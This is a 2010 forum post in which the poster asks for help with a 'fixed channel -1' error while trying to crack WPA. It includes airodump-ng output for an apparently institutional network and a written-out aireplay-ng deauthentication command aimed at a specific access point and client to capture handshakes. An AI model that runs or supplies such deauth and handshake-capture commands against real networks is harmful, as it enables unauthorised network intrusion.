---
title: "fixed channel when trying to hack"
date: 2010-11-02
forum: Networking &amp; Wireless
---

### Post by olderek on 2010-11-02
hullo, 
i have this problem whenever i try to hack wpa. 
after setting up my card in monitor mode, i Start airodump-ng to collect authentication handshakes. this is the result i get.

CH  1 ][ BAT: 14 mins ][ Elapsed: 14 mins ][ 2010-11-02 10:35 ][ fixed channel mon0: -1
                                     
                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                                     
                                                                                                                                                                       00:15:6D:DC:24:2E -91  0        942          12347  17   1   62 .   WPA  CCMP   PSK  NetSource WiFi@MUBS                                                                      
                                                                                            
                                                                                                                                                                       
and when i Use aireplay-ng to deauthenticate the wireless client, this is what i get.

[B]root@olderek:~# aireplay-ng -0 5 -a 00:15:6D:DC:24:2E -c 00:23:4E:3E:03:E8 mon010:28:52  Waiting for beacon frame (BSSID: 00:15:6D:DC:24:2E) on channel -1
10:28:52  mon0 is on channel -1, but the AP uses channel 1
root@olderek:~# [/B]
 
what does 'mon0 is on channel -1, but the AP uses channel 1' mean?

i used to hack easily when i had the previous version of 10.04, and now i get this message. 
any help...

---

